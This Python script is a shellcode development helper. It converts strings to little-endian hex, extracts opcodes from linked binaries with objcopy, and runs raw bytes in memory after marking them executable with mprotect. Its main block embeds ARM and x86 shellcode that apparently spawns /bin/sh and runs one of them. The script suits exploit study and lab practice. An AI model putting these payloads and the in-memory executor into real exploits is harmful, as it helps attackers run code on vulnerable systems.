#!/usr/bin/env python3
import ctypes
from subprocess import call

def stringToLittleEndianHex(string_to_hexify):
    """
        Accepts a string or bytes object then converts and prints the little
        endian representation of that string.
        Ex. stringToLittleEndianHex("/bin") -> 0x6e69622f

        Args:
            string_to_hexify: The stirng (or bytes string) you want to convert into hex

        Returns: Nothing
    """
    # If user passes in string object, encode it into an ascii bytes object
    try:
        string_to_hexify = string_to_hexify.encode('ascii')
    except:
        pass

    # Turn bytes object into a hexadecimal string
    big_endian_hex = string_to_hexify.hex()
    # Create an array containing each byte of the hexadecimal string
    hex_bytes = [big_endian_hex[i:i+2] for i in range(0, len(big_endian_hex), 2)]
    # Reverse the array of bytes (little endian) and join them together into one string
    little_endian_hex = "".join(reversed(hex_bytes))
    # Print the now converted little endian string with the hex prefix
    print("0x"+little_endian_hex)


def printShellcode(compiled_shellcode):
    """
        Accepts the name of a assembled and linked executable, uses objcopy to create
        a binary file then reads the opcodes from that file to create your shellcode.

        IMPORTANT: When linking your executable make sure to use the -N command, like so:
            ld your_program.o -N -o your_program

        Args:
            compiled_shellcode: The name of the executable you want to get the opcodes from

        Returns: Nothing
    """
    # Name of the binary file objcopy will make
    shellcode_binary = compiled_shellcode + ".bin"
    # Use subprocess.call to execute objcopy, creating a binary file from the executable
    ret_code = call(['objcopy', '-O', 'binary', compiled_shellcode, shellcode_binary])
    # If objcopy does not return 0, something has gone wrong
    if(ret_code != 0):
        print("Could not create a binary file, please assemble and link your code first")
        return

    # Open the binary file to read
    with open(shellcode_binary, 'rb') as binary:
        binary_data = binary.read()
        # Iterate all bytes and join them to a string as escaped hex codes
        shellcode = "".join(["\\x{:02x}".format(byte) for byte in binary_data])

    print("Shellcode for {} has length: {}\n{}".format(compiled_shellcode,
                                                       len(binary_data), shellcode))
    # Clean up, remove the created binary file
    call(['rm', shellcode_binary])



def testShellcode(shellcode_bytes):
    """
        Accepts a bytes string of machine opcodes,
        creates a function pointer using ctypes to call the
        shellcode then uses libc to to mark the memory pages
        as executable.

        Args:
            shellcode_bytes: A bytes object containing the shellcode (assembly opcodes)

        Returns:
            Returns a callable function, which will execute the passed in shellcode
    """
    # Turn passed in bytes array into a C-like character buffer
    shellcode = ctypes.create_string_buffer(shellcode_bytes)
    # Casts the character buffer to a function pointer (that doesn't take arguments)
    function = ctypes.cast(shellcode, ctypes.CFUNCTYPE(None))

    # Cast the function pointer to a null pointer, then gets the address being pointed too
    addr = ctypes.cast(function, ctypes.c_void_p).value
    # Get instance of the libc shared library
    libc = ctypes.CDLL("libc.so.6")
    # Call libc function to get the pagesize (in bytes) of the current process
    pagesize = libc.getpagesize()
    # Do integer division (//) on the address of our function pointer to get the starting
    # address of the first page of our function pointer
    addr_page = (addr // pagesize) * pagesize
    # Increment and loop through each page of our shellcode function pointer
    for page_start in range(addr_page, addr + len(shellcode_bytes), pagesize):
        # Use libc mprotect to make the pages executable (0x7 == READ|WRITE|EXECUTE)
        # Raise exception if the return value of mprotect is not 0
        assert libc.mprotect(page_start, pagesize, 0x7) == 0
    # Return our function pointer so it can be called by the caller whenever
    return function


if __name__ == "__main__":
    # Your shellcode goes here
    arm_shelly = (b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x04\xa0\x82\xea\x02\x02\xc2\x71"
                  b"\x05\xb4\x69\x46\x4f\xf0\x0b\x07\x01\xdf\x2d\x46\x2f\x62\x69\x6e"
                  b"\x2f\x73\x68\x58")
    arm_shelly2 = (b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71"
                   b"\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x58")
    x86_shelly = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53"
                  b"\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80")

    func = testShellcode(arm_shelly2)
    func()
    #stringToLittleEndianHex("//sh")
    #stringToLittleEndianHex("/bin")
    #printShellcode("good_shell2")


